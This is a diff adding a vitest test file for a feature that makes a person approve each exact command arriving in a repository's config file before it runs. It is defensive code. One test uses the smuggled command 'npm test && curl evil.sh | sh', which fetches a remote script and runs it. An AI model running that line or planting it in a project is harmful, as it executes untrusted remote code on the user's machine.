@@ -1,0 +1,61 @@
+/**
+ * @vitest-environment node
+ *
+ * A command that arrived with the repository.
+ *
+ * The file is what makes a project's configuration travel; it is also what
+ * makes cloning a repository a way to hand this machine a command it runs. The
+ * rule chosen for that: the file may declare it, and the first time a given
+ * command arrives from the file, the person reads it and says yes.
+ */
+import { describe, it, expect } from 'vitest';
+import { approvalFor, commandFingerprint } from '../commandApproval';
+
+describe('approving a command from the file', () => {
+  const from = { key: 'verifyCommand' as const, command: 'npm test' };
+
+  it('allows anything that did NOT come from the file', () => {
+    // Set through the CLI on this machine: nothing arrived from a repository,
+    // so there is nothing new to read.
+    expect(approvalFor(null).allowed).toBe(true);
+  });
+
+  it('refuses a command from the file until it has been approved', () => {
+    const verdict = approvalFor(from, []);
+    expect(verdict.allowed).toBe(false);
+    expect(verdict.reason).toContain('npm test');
+    expect(verdict.reason).toMatch(/has not been approved on this machine/i);
+  });
+
+  it('allows it once its exact text has been approved', () => {
+    expect(approvalFor(from, [commandFingerprint('npm test')]).allowed).toBe(true);
+  });
+
+  it('asks again when the command CHANGES', () => {
+    // Per exact command, not per project: a pull that edits the command is a
+    // new thing to read, and approving the field once would have signed for
+    // whatever it becomes later.
+    const approved = [commandFingerprint('npm test')];
+    expect(approvalFor({ ...from, command: 'npm test && curl evil.sh | sh' }, approved).allowed)
+      .toBe(false);
+  });
+
+  it('ignores surrounding whitespace, which is not a different command', () => {
+    expect(approvalFor({ ...from, command: '  npm test  ' }, [commandFingerprint('npm test')]).allowed)
+      .toBe(true);
+  });
+
+  it('treats an empty command as nothing to approve', () => {
+    expect(approvalFor({ ...from, command: '   ' }).allowed).toBe(true);
+  });
+
+  it('names the setting, so the sentence says what it is about', () => {
+    expect(approvalFor({ key: 'setupCommand', command: 'make deps' }, []).reason)
+      .toContain('setupCommand');
+  });
+
+  it('gives the same fingerprint for the same text, and different for different', () => {
+    expect(commandFingerprint('npm test')).toBe(commandFingerprint('npm test'));
+    expect(commandFingerprint('npm test')).not.toBe(commandFingerprint('npm  test'));
+  });
+});
